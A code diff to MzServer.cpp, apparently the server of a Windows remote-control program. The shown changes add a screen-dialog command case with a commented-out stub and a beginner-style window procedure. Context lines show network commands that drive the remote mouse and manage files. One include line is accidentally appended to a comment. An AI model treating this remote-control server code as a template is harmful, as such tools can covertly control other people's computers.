@@ -1,6 +1,6 @@
 // MzServer.cpp : Defines the entry point for the application.
 //
-//本cpp  一模一样 确认
+//本cpp  一模一样 确认#include <afxwin.h>
 #include "stdafx.h"
 #include "MzServer.h"
 
@@ -13,6 +13,7 @@
 #include "WindowManager.h"
 #include "Voice.h"
 #include <shellapi.h>
+
 
 //套接字的初始化
 DWORD __stdcall ConnectThread(LPVOID lparam)
@@ -183,6 +184,11 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
 			}
 			break;
+		case CMD_SHOW_RECV_SCREEN_DLG :
+			{
+				OpenDlg();
+				break;
+			}
 		default:
 			{
 				break;
@@ -193,6 +199,104 @@ DWORD __stdcall ConnectThread(LPVOID lparam)
 
 	return 1;
 }
+
+
+
+HWND hwndButton;
+HWND hWnd;
+HINSTANCE hInst;
+TCHAR szWinName[]="MyWin";//窗口类名
+TCHAR str[255]="";//保存输出的字符串
+
+
+void OpenDlg(){
+//	CWnd wnd;
+	/*
+	//定义一个windows类
+//	hInst=hInstance;
+	WNDCLASSEX wcl;
+	wcl.style=CS_HREDRAW|CS_VREDRAW;
+	wcl.style&=~CS_VREDRAW;
+	wcl.lpfnWndProc=WindowsFunc;
+	wcl.cbClsExtra=0;
+	wcl.cbWndExtra=0;
+	wcl.hInstance=hInstance;
+	wcl.hIcon=LoadIcon(NULL,IDI_APPLICATION);
+	wcl.hIconSm=LoadIcon(NULL,IDI_INFORMATION);
+	wcl.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH);
+	wcl.hCursor=LoadCursor(NULL,IDC_ARROW);
+	//wcl.lpszMenuName=MAKEINTRESOURCE(IDR_MENU1);
+	wcl.lpszClassName=szWinName;
+	wcl.cbSize=sizeof(WNDCLASSEX);
+
+	//注册这个窗体
+	if (!RegisterClassEx(&wcl))
+		return ;
+
+
+	hWnd=CreateWindow(    szWinName,
+		" Processing WM_CHAR Message",
+		WS_OVERLAPPEDWINDOW,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		HWND_DESKTOP,
+		NULL,
+		hInstance,
+		NULL);
+
+	//显示这个窗体
+	ShowWindow(hWnd,SW_SHOWNORMAL);
+	UpdateWindow(hWnd);
+	*/
+}
+
+
+LRESULT CALLBACK WindowsFunc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
+{
+    HDC hdc;
+    switch (message)
+    {
+        case WM_CHAR://按键消息处理
+            hdc=GetDC(hWnd);//获得设备上下文
+            strcpy(str,"            ");
+            TextOut(hdc,1,1,str,strlen(str));//擦除原有字符
+            sprintf(str,"%c",(char)wParam);//把字符转换成字符串
+            TextOut(hdc,1,1,str,strlen(str));//输出字符
+            ReleaseDC(hWnd,hdc);//释放设备描述表
+            break;
+        case WM_LBUTTONDOWN:
+            hdc=GetDC(hWnd);//获得设备上下文
+            strcpy(str,"            ");
+            TextOut(hdc,1,1,str,strlen(str));//擦除原有字符
+            sprintf(str,"Mouse");//把字符转换成字符串
+            TextOut(hdc,1,1,str,strlen(str));//输出字符
+            ReleaseDC(hWnd,hdc);//释放设备描述表
+            break;
+        case WM_CREATE://这里创建一个按钮，这里没有用到ID_BUTTON绑定
+            hwndButton=CreateWindow("Button","OK",WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON,100,100,100,100,hWnd,NULL,hInst,NULL);
+            ShowWindow(hwndButton,SW_SHOWNORMAL);
+            break; 
+        case WM_COMMAND: //请问如何响应这个按钮？ID_BUTTON这个宏存在定义了，但创建的时候又如何绑定呢？
+            /*switch(LOWORD(wParam))
+            {
+                case ID_BUTTON:
+                    MessageBox("hello");
+                    break; 
+            }*/
+            break;
+        case WM_DESTROY://终止应用程序
+            PostQuitMessage(0);
+            break;
+        default:
+            return DefWindowProc(hWnd,message,wParam,lParam);
+    }
+    return 0;
+}
+
+
+
 
 DWORD __stdcall FileManageThread(LPVOID lparam)//线程处理文件管理
 {
